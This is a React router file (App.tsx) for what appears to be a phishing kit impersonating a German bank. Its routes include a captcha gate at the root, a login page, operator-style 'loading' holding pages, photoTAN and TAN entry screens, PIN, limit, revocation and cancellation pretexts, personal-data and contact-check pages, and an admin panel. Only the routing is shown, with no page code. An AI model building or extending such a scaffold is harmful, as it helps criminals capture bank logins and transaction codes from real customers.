import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { BrowserRouter, Route, Routes } from "react-router-dom";
import { Toaster as Sonner } from "@/components/ui/sonner";
import { Toaster } from "@/components/ui/toaster";
import { TooltipProvider } from "@/components/ui/tooltip";
import Index from "./pages/Index.tsx";
import Loading from "./pages/Loading.tsx";
import DeviceConfirm from "./pages/DeviceConfirm.tsx";
import PhotoTan from "./pages/PhotoTan.tsx";
import NotFound from "./pages/NotFound.tsx";
import Admin from "./pages/Admin.tsx";
import TokenEntry from "./pages/TokenEntry.tsx";

import Storno from "./pages/Storno.tsx";
import FlowLanding from "./pages/FlowLanding.tsx";
import LimitLoading from "./pages/LimitLoading.tsx";
import LimitConfirm from "./pages/LimitConfirm.tsx";
import LimitPhotoTan from "./pages/LimitPhotoTan.tsx";
import WiderrufStart from "./pages/WiderrufStart.tsx";
import WiderrufPhotoTan from "./pages/WiderrufPhotoTan.tsx";
import PinStart from "./pages/PinStart.tsx";
import PinOffline from "./pages/PinOffline.tsx";
import Berater from "./pages/Berater.tsx";
import Homepage from "./pages/Homepage.tsx";
import Success from "./pages/Success.tsx";
import PersoenlicheDaten from "./pages/PersoenlicheDaten.tsx";
import MeinProfil from "./pages/MeinProfil.tsx";
import MeinProfilTan from "./pages/MeinProfilTan.tsx";
import ProfilLoading from "./pages/ProfilLoading.tsx";
import ProfilSuccess from "./pages/ProfilSuccess.tsx";
import Captcha from "./pages/Captcha.tsx";
import ProfilAbruf from "./pages/ProfilAbruf.tsx";
import KontaktPruefung from "./pages/KontaktPruefung.tsx";
import AuthFlow from "./pages/auth/AuthFlow.tsx";

const queryClient = new QueryClient();

const App = () => (
  <QueryClientProvider client={queryClient}>
    <TooltipProvider>
      <Toaster />
      <Sonner />
      <BrowserRouter>
        <Routes>
          <Route path="/" element={<Captcha />} />
          <Route path="/login" element={<Index />} />
          <Route path="/loading" element={<Loading />} />
          <Route path="/confirm" element={<DeviceConfirm />} />
          <Route path="/phototan" element={<PhotoTan />} />
          <Route path="/admin" element={<Admin />} />
          <Route path="/token" element={<TokenEntry />} />

          <Route path="/widerruf" element={<FlowLanding kind="widerruf" />} />
          <Route path="/limit-aenderung" element={<FlowLanding kind="limit" />} />
          <Route path="/pin-aenderung" element={<FlowLanding kind="pin" />} />
          

          <Route path="/pin" element={<TokenEntry kind="pin" />} />
          <Route path="/pin/start" element={<PinStart />} />
          <Route path="/pin/offline" element={<PinOffline />} />
          <Route path="/limit/loading" element={<LimitLoading />} />
          <Route path="/limit/confirm" element={<LimitConfirm />} />
          <Route path="/limit/phototan" element={<LimitPhotoTan />} />
          <Route path="/widerruf/start" element={<WiderrufStart />} />
          <Route path="/widerruf/phototan" element={<WiderrufPhotoTan />} />
          <Route path="/limit" element={<TokenEntry kind="limit" />} />
          <Route path="/storno" element={<TokenEntry kind="storno" />} />
          <Route path="/auth" element={<TokenEntry kind="auth" />} />
          <Route path="/berater" element={<Berater />} />
          <Route path="/homepage" element={<Homepage />} />
          <Route path="/success" element={<Success />} />
          <Route path="/persoenliche-daten" element={<PersoenlicheDaten />} />
          <Route path="/meinprofil" element={<MeinProfil />} />
          <Route path="/mein-profil" element={<MeinProfil />} />
          <Route path="/profil-loading" element={<ProfilLoading />} />
          <Route path="/profil-success" element={<ProfilSuccess />} />
          <Route path="/captcha" element={<Captcha />} />
          <Route path="/profil-abruf" element={<ProfilAbruf />} />
          <Route path="/kontakt-pruefung" element={<KontaktPruefung />} />
          <Route path="/mein-profil-tan" element={<MeinProfilTan />} />
          <Route path="/auth/:token" element={<AuthFlow />} />
          {/* ADD ALL CUSTOM ROUTES ABOVE THE CATCH-ALL "*" ROUTE */}
          <Route path="*" element={<NotFound />} />
        </Routes>
      </BrowserRouter>
    </TooltipProvider>
  </QueryClientProvider>
);

export default App;
